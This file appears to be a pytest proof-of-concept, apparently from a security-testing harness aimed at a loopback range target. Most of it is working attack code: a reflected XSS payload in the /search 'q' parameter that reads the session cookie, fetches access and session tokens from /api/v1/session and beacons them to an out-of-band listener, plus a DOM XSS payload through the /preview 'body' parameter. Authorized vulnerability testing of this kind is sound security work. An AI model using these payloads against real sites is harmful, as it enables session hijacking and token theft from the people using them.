"""
Render-path XSS -> session/token theft PoC against authorized live target
http://127.0.0.1:62395. Non-destructive: one victim test identity (alice),
a few bytes exfiltrated to the in-scope loopback OOB listener as PROOF.

Run: python3 -I -m pytest -q test_render_xss.py -s
"""
import os, urllib.parse, urllib.request
from p1hunt_dyn import Client
from p1hunt_browser import Browser

B = os.environ.get("P1HUNT_BASE_URL", "http://127.0.0.1:62395")
cli = Client()


def _victim_cookie():
    return [{"name": "range_session", "value": "alice", "url": B}]


def test_reflected_search_xss_steals_session_and_tokens():
    """Reflected XSS in /search?q= executes attacker JS in the victim's authed
    origin, reads the non-HttpOnly session cookie, pulls accessToken+sessionToken
    from /api/v1/session, and exfiltrates them to the attacker's OOB listener."""
    oob, tok = cli.oob_url()
    # onerror fires in the victim browser: read cookie + fetch session tokens, beacon out.
    js = ("var c=document.cookie;"
          "fetch('/api/v1/session').then(r=>r.json()).then(j=>{"
          "new Image().src='%s/x?cookie='+encodeURIComponent(c)"
          "+'&at='+encodeURIComponent(j.accessToken)"
          "+'&st='+encodeURIComponent(j.sessionToken);alert('xss');});" % oob)
    payload = '"><img src=x onerror="%s">' % js
    url = "/search?q=" + urllib.parse.quote(payload, safe="")

    with Browser(headless=True, settle_ms=1500) as b:
        b.set_identity("alice", cookies=_victim_cookie())
        obs = b.goto(url, settle_ms=1500)
        print("EXECUTED:", obs.executed, "exec_events:", obs.execution_proof)
        print("REQUESTS:", [r["url"] for r in (obs.requests or []) if "62490" in r["url"]])
        exfil_fired = any("62490" in r["url"] for r in (obs.requests or []))
        assert exfil_fired, "attacker beacon never fired"
        assert obs.executed, "alert() not observed"

    assert cli.oob_received(tok, wait=5.0), "OOB beacon not received -> exfil unproven"


def test_server_does_not_escape_q():
    """Control: raw <script> reflected unescaped by the server (root cause)."""
    r = urllib.request.urlopen(B + "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", timeout=15)
    html = r.read().decode()
    assert "<script>alert(1)</script>" in html, html


def test_preview_dom_xss_executes():
    """DOM XSS: /preview sets innerHTML = location param 'body' (img onerror runs)."""
    oob, tok = cli.oob_url()
    payload = "<img src=x onerror=\"new Image().src='%s/dom';alert('x')\">" % oob
    url = "/preview?body=" + urllib.parse.quote(payload, safe="")
    with Browser(headless=True, settle_ms=1500) as b:
        obs = b.goto(url, settle_ms=1500)
        print("PREVIEW EXECUTED:", obs.executed, obs.execution_proof)
        assert obs.executed, "preview innerHTML sink did not execute"
    assert cli.oob_received(tok, wait=5.0), "preview OOB beacon not received"
